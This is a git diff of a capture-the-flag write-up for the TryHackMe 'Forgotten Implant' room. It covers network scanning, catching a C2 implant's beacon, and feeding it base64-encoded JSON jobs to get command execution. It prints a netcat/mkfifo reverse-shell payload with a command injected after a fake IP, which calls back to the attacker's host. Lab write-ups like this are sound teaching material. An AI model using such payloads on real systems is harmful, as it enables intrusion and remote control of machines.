@@ -4,11 +4,20 @@ date: 2021-08-01 12:00:00
 categories: [CTF, TryHackMe]
 tags: [wireshark]     # TAG names should always be lowercase
 ---
+<style>
+  :term {
+    # --color-primary: {{ settings.color_primary }};
+    --color-body-text: {{ settings.color_body_text }};
+    --color-main-background: {{ blue }};
+  }
+</style>
 ![](https://tryhackme-images.s3.amazonaws.com/room-icons/1968fc18c7598f797954065d05a7f8f0.png)
 
 ## Enumeration
 
-We start as usual with an nmap scan, but the result shows all ports closed. Even more lengthy / intensive scans give the same result.
+
+We start this adventure as usual with an nmap scan, but the result shows all ports closed. Even more lengthy / intensive scans give the same result.
+
 
 ```bash
 ┌──(user㉿kali-linux-2022-2)-[~]
@@ -22,9 +31,9 @@ Not shown: 1000 closed tcp ports (conn-refused)
 Nmap done: 1 IP address (1 host up) scanned in 1.72 seconds
 ```
 
-The only real hint for this box is that we're worknig with an implant from a C2 platform, so it likely should be calling us not listening.
+We were offered a hint for this box that we're worknig with an implant from a C2 platform. Those implants tend to beacon out rather than listen, so let's look for a beacon.
 
-We run Wireshark and listen on our VPN at `tun0` and kill any leftover nmap sessions to limit the noise from the rest of the network. We see that the machine is trying to call us on port 81. It must know our IP due to the port scan earlier. 
+We run Wireshark and listen on our VPN at `tun0`, killing any leftover nmap sessions to limit the noise from the rest of the network. We see that the machine is trying to call us on port 81. It must know our IP due to the port scan earlier. 
 
 ![](/assets/forgotten-implant/Untitled.png)
 
@@ -87,11 +96,11 @@ After a brief wait we see the implant call our file, followed by a second call t
 
 Decoding the base 64 we see `{"success": false, "result": "Encoding error"}`
 
-OK, so it wants b64. On the next round we send
+OK, so it wants base 64. On the next round we send:
 
 `echo 'ls' | base64 > get-job/ImxhdGVzdCI=`
 
-And get back
+and get back:
 
 `{"success": false, "result": "JSON error"}`
 
@@ -99,25 +108,30 @@ Let’s try the JSON format we received in the heartbeat message. We submit:
 
 `echo '{"job_id": 0, "cmd": "ls"}' | base64 > get-job/ImxhdGVzdCI=`
 
-and get back
+and get back:
 
 `{"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}`
 
 We've achieved RCE and found the first flag already, let's grab it right now!
 
+Send:
+
 `echo '{"job_id": 0, "cmd": "cat user.txt"}' | base64 > get-job/ImxhdGVzdCI=`
+
+Receive:
 
 `{"job_id": 0, "cmd": "cat user.txt", "success": true, "result": "THM{[redacted]}\n"}`
 
 ## Initial Shell
 
-Some of the more popular shells don’t seem to work on this box but eventually we find one that does.  
+Some of the more popular shells don’t seem to work on this box but eventually we find one that does. We set a listener and send the below payload to get a shell as ada:  
 
 ```json
 {"job_id": 0, "cmd": "127.0.0.1 && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.74.177 4444 >/tmp/f"}
 ```
 
-`python3 -c 'import pty;pty.spawn("/bin/bash");'`
+
+
 
 ## Local Enumeration
 
@@ -142,7 +156,10 @@ for product in cursor.fetchall():
 
 We enumerate the database locally using the credentuals here but find nothing interesting. The credentials also don't work to `sudo` or `su` to any of our other users. 
 
-We also have a hidden directory `.implant` off of our home. 
+We also have a hidden directory `.implant` off of ada's home, containing the malware that we're connecting through. An interesting read, but we're already in ada's account so nothing to exploit here.  
+
+<details>
+<summary>.implant.py</summary>
 
 ```python
 import base64
@@ -264,6 +281,7 @@ if __name__ == "__main__":
             commander.save_log()
 
 ```
+</details>
 
 Enumerating fi’s home directory we can see that he has `sudo` permissions. This looks like a good account to transition to if we can find a path. 
 
